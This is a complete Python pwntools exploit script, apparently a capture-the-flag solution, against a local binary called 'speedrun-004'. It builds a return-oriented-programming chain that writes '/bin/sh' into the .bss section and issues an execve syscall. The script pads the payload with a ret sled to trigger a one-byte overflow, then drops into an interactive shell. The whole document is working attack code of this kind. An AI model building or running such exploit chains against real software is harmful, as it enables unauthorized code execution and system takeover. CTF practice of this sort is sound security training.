from pwn import *

# context.log_level = 'debug'
TargetPath = './speedrun-004'


def createROPPayload(rop):
  popRax = p64(rop.find_gadget(['pop rax', 'ret']).address)
  popRdx = p64(rop.find_gadget(['pop rdx', 'ret']).address)
  popRdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
  popRsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
  bss = p64(0x6b6030)

  bottom = popRax
  bottom += bss
  bottom += popRdx
  bottom += p64(0x0068732f6e69622f)  # /bin/sh
  # p64(rop.find_gadget(['mov qword ptr [rax], rdx', 'ret']).address)
  bottom += p64(0x48d301)

  bottom += popRax
  bottom += p64(0x3b)
  bottom += popRdi
  bottom += bss
  bottom += popRsi
  bottom += p64(0)
  bottom += popRdx
  bottom += p64(0)
  bottom += p64(rop.find_gadget(['syscall']).address)

  return p64(rop.find_gadget(['ret']).address) * ((256 - len(bottom)) // 8) + bottom + b"\x00"


def main():
  targetElf = ELF(TargetPath)
  targetRop = ROP(targetElf)
  payload = createROPPayload(targetRop)

  targetIO = process(TargetPath)
  targetIO.recvuntil(b'how much do you have to say?')
  targetIO.sendline(b'257')
  # raw_input()
  targetIO.recvuntil(b'Ok, what do you have to say for yourself?')
  targetIO.sendline(payload)
  targetIO.interactive()


if __name__ == '__main__':
  main()
